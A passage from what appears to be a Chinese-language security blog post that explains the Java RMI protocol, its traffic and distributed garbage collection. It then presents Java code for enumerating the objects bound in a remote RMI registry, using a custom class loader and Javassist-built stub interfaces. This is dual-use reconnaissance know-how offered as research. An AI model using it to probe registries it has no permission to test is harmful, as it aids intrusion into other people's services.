</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>然后通过<code>LocateRegistry.getRegistry</code>方法访问Registry得到registry对象，通过lookup方法拿到绑定在&quot;calc&quot;上的实例对象，并调用其方法</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">xyz<span class="token punctuation">.</span>eki</span><span class="token punctuation">;</span>


<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
             <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">&quot;192.168.111.1&quot;</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ICalc</span> calc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ICalc</span><span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> li <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            li<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            li<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>calc<span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h4 id="实际效果"><a href="#实际效果" class="header-anchor">#</a> 实际效果</h4> <p>可以看到最后在客户端输出的结果为126</p> <p><img src="https://md.buptmerak.cn/uploads/upload_cc65eecf412d43d5645cf22525e113b5.png" alt=""></p> <p>这也就印证了我们之前说的对象实际是在远程服务端执行方法然后再把结果回传给客户端</p> <h3 id="发生了什么"><a href="#发生了什么" class="header-anchor">#</a> 发生了什么</h3> <p>关于协议的介绍，官方的链接如下：</p> <p>https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html</p> <p>经过一段时间的摸索后，我个人简单的归纳如下</p> <p>首先注册中心，<code>LocateRegistry.createRegistry</code>启动了一个注册网关监听给定的地址。</p> <p>然后服务端生成一个远程对象(需实现Remote接口),UnicastRemoteObject会把这个对象广播出去，也即启动一个监听地址并生成对应的ObjID（该值唯一），所以其实有两种方式广播，具体可以见下面文章的讨论：</p> <p>https://stackoverflow.com/questions/2194935/java-rmi-unicastremoteobject-what-is-the-difference-between-unicastremoteobje</p> <p>此后，服务端需要把这个远程对象注册到注册中心上，所以需要访问注册中心，发送一个bind请求,包括注册名和一个存根（这个存根包含远程对象的接口名，ObjID,和监听的地址），注册中心会维护一张注册表，维护注册名和远程对象存根的关系。</p> <p>这些工作完成后，客户端就可以调用远程对象的方法了。</p> <ol><li>首先访问注册中心，根据注册名找对应的远程对象，这个时候注册中心会根据维护的注册表返回对应远程对象存根</li> <li>客户拿到远程存根的信息，通过存根访问服务端远程对象监听的地址，通过客户端已知的远程对象的方法名和参数类型访问服务端对应的方法，传递方法所需的参数。</li> <li>服务端的远程对象监听到客户端的消息，根据客户端提供的方法信息和参数，执行自身的方法，并将结果回传给客户端，完成整个调用流程。</li></ol> <p>下面是简单画的流程示意图</p> <p><img src="https://md.buptmerak.cn/uploads/upload_f6dcd30875579430ba6b4980c1957f97.png" alt=""></p> <p>更具体的，对于发生在客户端和服务端的交互来说，客户端存了一份远程对象存根Stub和服务端实际上远程对象（Skeleton）进行沟通.</p> <p><img src="https://md.buptmerak.cn/uploads/upload_3e674679fc21ed365b9fa2c34a1a3293.png" alt=""></p> <p>事实上，Registry也是一种远程对象，所以有<code>sun.rmi.registry.RegistryImpl_Stub</code>和<code>sun.rmi.registry.RegistryImpl_Skel</code>这两个类来进行处理</p> <p>如果想要更好的调试整个过程，可以在idea中给几个函数下断点进行调试分析</p> <ul><li><p>Server/Client端操作Registry<code>sun.rmi.registry.RegistryImpl_Stub</code> 下面的<code>bind/lookup/...</code>等方法</p></li> <li><p>Registy端实际处理<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>然后调用<code>sun.rmi.registry.RegistryImpl</code>的相关函数</p></li></ul> <p>此外，我们可以认为Registry也是一个特殊的远程对象,下面统称为服务端</p> <ul><li>服务端通过<code>java.rmi.server.UnicastRemoteObject#exportObject</code>开启指定端口上的远程对象服务</li> <li>服务端通过<code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code>中的循环来监听输入流</li> <li>客户端使用<code>sun.rmi.server.UnicastRef#invoke</code>来调用服务端远程对象的方法。对应的，服务端远程对象使用<code>sun.rmi.UnicastServerRef</code>来处理远端对本服务对象的调用。</li></ul> <h3 id="流量分析"><a href="#流量分析" class="header-anchor">#</a> 流量分析</h3> <p>根据上面的流程我们便能理解下面的TCP层消息格式了</p> <p>Request:</p> <p>|magic|version|protocol|opType|<strong>objid</strong>|<strong>opNum</strong>|<strong>hash</strong>|<strong>object</strong>|</p> <ul><li>在lookup时，因为我们访问的对象是公共已知的远程对象Registry我们的objid为0，opNum和对应的hash值可以在反编译的源码中查到，object为对应函数的参数，比如下面是客户端调用注册中心lookup方法对应的各参数值：</li></ul> <p><img src="https://md.buptmerak.cn/uploads/upload_88e9178c23f5759017dd7819dec7e17f.png" alt=""></p> <ul><li>在call时，我们的objid为远程对象的objid,opNum为-1，hash为<code>sun.rmi.server.Util#computeMethodHash</code>计算出来的函数哈希,object为传递的方法参数</li></ul> <p>Response:</p> <p>|returnValue|<strong>returnType</strong>|<strong>uuid</strong>|<strong>object</strong>|</p> <p>常规的<code>returnValve</code>就是0x51</p> <p><img src="https://md.buptmerak.cn/uploads/upload_4f9fb3ce86e8f93172097318cff47822.png" alt=""></p> <p>这个通信协议也就是实现RMI的应用层协议--JRMP (Java Remote Method Protocol)</p> <p>下面我们通过流量的角度来对RMI进行分析,也是对我们刚才消息格式的一个验证。</p> <p>运行逻辑为</p> <ol><li>启动Registry</li> <li>启动Server绑定IMath</li> <li>启动Client lookup Registry</li> <li>Client 调用 IMath.add</li></ol> <p>流量包如下</p> <ol><li>tcp stream 0</li></ol> <p><img src="https://md.buptmerak.cn/uploads/upload_10cbfd83c217e363b174328d2bfb6363.png" alt=""></p> <p>对应bind过程，服务端将远程对象存根注册到Registry上，这里的<code>http://192.168.111.1:9080</code>是服务端指定的codebase(具体在后文说明)</p> <ol start="2"><li>tcp stream 1</li></ol> <p><img src="https://md.buptmerak.cn/uploads/upload_cefb6ee06fcb44a22cb607c597faa213.png" alt=""></p> <p>因为Server的服务绑定在192.168.56.1上 ，Registry向Server提供的远程服务请求DGC，随后远程服务返回一个Lease。</p> <ol start="3"><li>tcp stream 2</li></ol> <p><img src="https://md.buptmerak.cn/uploads/upload_d647a3054adc22787b0148c907b07141.png" alt=""></p> <p>此时Client向Registry发出请求获取远程对象</p> <p>对应lookup过程</p> <ol start="4"><li>tcp stream 3</li></ol> <p>Client向Server提供的远程服务请求DGC，随后远程服务返回一个Lease,此后Client调用远程方法。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_e0d39a536ae484326ecd1b300b988ece.png" alt=""></p> <p>等等，好像和我们想的不太一样，为什么会出现DGC请求，DGC请求是什</p> <p><strong>DGC（distributed garbage-collection)</strong> 是指JAVA支撑远程方法调用设计的一套分布式垃圾收集协议。DGC有两个方法，一个是<code>dirty</code>,一个是<code>clean</code>具体的来说</p> <ul><li><p>客户端在调用远程方法时，首先会向服务端发起一次<code>dirty call</code>，以通知服务端短时间内不要回收对应的远程对象</p></li> <li><p>服务端返回给客户端一个<code>lease</code>，该对象告诉了客户端接下来多久的时间内该对象是有效的。如果客户端在时间到期后还需要使用该对象，则需要继续调用<code>dirty call</code>；</p></li> <li><p><code>DGCClient</code>会跟踪每一个<code>dirty call</code>对应的<code>liveRef</code>，当他们在客户端已经不再有效后，就会发起<code>clear call</code>告诉服务端可以回收有关对象了。</p></li></ul> <p>DCG相关源码如下：</p> <p>https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/rmi/transport/DGCClient.java</p> <h2 id="_0x01-信息泄露问题"><a href="#_0x01-信息泄露问题" class="header-anchor">#</a> 0x01 信息泄露问题</h2> <p>既然list方法可以返回有的绑定名，那么我们可不可以去通过list+lookup的方式遍历获得所有的远程方法信息呢</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">try</span> <span class="token punctuation">{</span>
	<span class="token class-name">RMIRegistryEndpoint</span> rmiRegistry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RMIRegistryEndpoint</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">Remote</span><span class="token punctuation">[</span><span class="token punctuation">]</span> remoteObjList <span class="token operator">=</span> rmiRegistry<span class="token punctuation">.</span><span class="token function">packup</span><span class="token punctuation">(</span>rmiRegistry<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span><span class="token punctuation">{</span>
	t<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>这里的rmiRegistry是对Registry类的一个包装，packup相当于<code>foreach name in list: lookup(name)</code></p> <p><img src="https://md.buptmerak.cn/uploads/upload_af673562b533df1a468d08bb74befa7a.png" alt=""></p> <p>但是当我们测试的时候发现直接报错了，而且报的错还是<code>java.lang.ClassNotFoundException</code>和<code>java.rmi.UnmarshalException</code>,一个说明实例化远程接口需要本地加载对应的类，而此处我们没有对应的类，一个说明rmi的过程中肯定涉及到反序列化，这里因为没有对应类造成反序列化失败。</p> <p>那么一个简单的思路就是在本地先把这些接口类创建好。因为根据报错信息我们是可以知道类名。</p> <p>通过阅读<a href="https://github.com/qtc-de/remote-method-guesser" target="_blank" rel="noopener noreferrer">remote_method_guesser<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>项目的源码，我发现作者是通过重载RMIClassLoader的方式来操作的</p> <p>rmi提供了一个<code>RMIClassLoaderSpi</code>的抽象类用来加载远程类，其默认的实现是RMIClassLoader，这里我们对他进行继承重写。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomRMIClassLoader</span> <span class="token keyword">extends</span> <span class="token class-name">RMIClassLoaderSpi</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">RMIClassLoaderSpi</span> originalLoader <span class="token operator">=</span> <span class="token class-name">RMIClassLoader</span><span class="token punctuation">.</span><span class="token function">getDefaultProviderInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">Set</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> codebases <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> codebase<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span> defaultLoader<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> resolvedClass <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

        <span class="token comment">//不从远程加载取消codebase </span>
        codebase <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">&quot;_Stub&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token class-name">ReflectUtils</span><span class="token punctuation">.</span><span class="token function">makeLegacyStub</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>

            resolvedClass <span class="token operator">=</span> originalLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>codebase<span class="token punctuation">,</span>name<span class="token punctuation">,</span>defaultLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CannotCompileException</span> <span class="token operator">|</span><span class="token class-name">NotFoundException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token class-name">ExceptionHandler</span><span class="token punctuation">.</span><span class="token function">internalError</span><span class="token punctuation">(</span><span class="token string">&quot;loadClass&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Unable to compile unknown stub class.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> resolvedClass<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">loadProxyClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> codebase<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces<span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span> defaultLoader<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> resolvedClass <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> interfaceName<span class="token operator">:</span>
                 interfaces<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">ReflectUtils</span><span class="token punctuation">.</span><span class="token function">makeInterface</span><span class="token punctuation">(</span>interfaceName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            codebase <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            resolvedClass <span class="token operator">=</span> originalLoader<span class="token punctuation">.</span><span class="token function">loadProxyClass</span><span class="token punctuation">(</span>codebase<span class="token punctuation">,</span>interfaces<span class="token punctuation">,</span>defaultLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CannotCompileException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">ExceptionHandler</span><span class="token punctuation">.</span><span class="token function">internalError</span><span class="token punctuation">(</span><span class="token string">&quot;loadProxyClass&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Unable to compile unknown interface class.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> resolvedClass<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">ClassLoader</span> <span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token class-name">String</span> codebase<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span> <span class="token punctuation">{</span>
        codebase <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> originalLoader<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span>codebase<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getClassAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> cl<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> originalLoader<span class="token punctuation">.</span><span class="token function">getClassAnnotation</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br></div></div><p>可以看到我们采取的方案是取消codebase（这里对codebase的作用留一个疑问，在下个部分来讨论）,通过本地javaassit来动态构建接口，再调用默认的实现来加载类，因为此时我们的接口类已经由本地javaassit构建好了，所以不会报ClassNotFound的错误。其中动态构造类的源码如下。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectUtils</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ClassPool</span> pool<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">CtClass</span> remoteClass<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">CtClass</span> remoteStubClass<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> createdClasses<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 初始化存储remoteClass和remoteStubClass方便生成接口时调用
     */</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            remoteClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">getCtClass</span><span class="token punctuation">(</span><span class="token class-name">Remote</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            remoteStubClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">getCtClass</span><span class="token punctuation">(</span><span class="token class-name">RemoteStub</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">ExceptionHandler</span><span class="token punctuation">.</span><span class="token function">internalError</span><span class="token punctuation">(</span><span class="token string">&quot;ReflectUtil.init&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Caught unexpected NotFoundException.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        createdClasses <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 将RMIClassLoader设置我们自定义的RMICLASSLoader
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">enableCustomRMIClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">&quot;java.rmi.server.RMIClassLoaderSpi&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;xyz.eki.jim.internal.CustomRMIClassLoader&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 生成对应的远程接口，继承自Remote
     *
     * @param className 类名
     * @return created 生成类
     * @throws CannotCompileException 编译错误
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeInterface</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

        <span class="token class-name">CtClass</span> intfClz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeInterface</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> remoteClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
        createdClasses<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> intfClz<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 设置类serialVersionUID字段为2L,对于一些远程类有用
     *
     * @param ctClass class where the serialVersionUID should be added to
     * @throws CannotCompileException should never be thrown in practice
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">addSerialVersionUID</span><span class="token punctuation">(</span><span class="token class-name">CtClass</span> ctClass<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span>
    <span class="token punctuation">{</span>
        <span class="token class-name">CtField</span> serialID <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtField</span><span class="token punctuation">(</span><span class="token class-name">CtPrimitiveType</span><span class="token punctuation">.</span>longType<span class="token punctuation">,</span> <span class="token string">&quot;serialVersionUID&quot;</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
        serialID<span class="token punctuation">.</span><span class="token function">setModifiers</span><span class="token punctuation">(</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">PRIVATE</span> <span class="token operator">|</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">STATIC</span> <span class="token operator">|</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">addField</span><span class="token punctuation">(</span>serialID<span class="token punctuation">,</span> <span class="token class-name">CtField<span class="token punctuation">.</span>Initializer</span><span class="token punctuation">.</span><span class="token function">constant</span><span class="token punctuation">(</span><span class="token number">2L</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 这个函数与makeInterface类似，但是作用于传统的RMI Remote Stub机制
     * 其中生成的临时接口类需要设置serialVersionUID为2来满足RMI RemoteStub的默认值
     */</span>
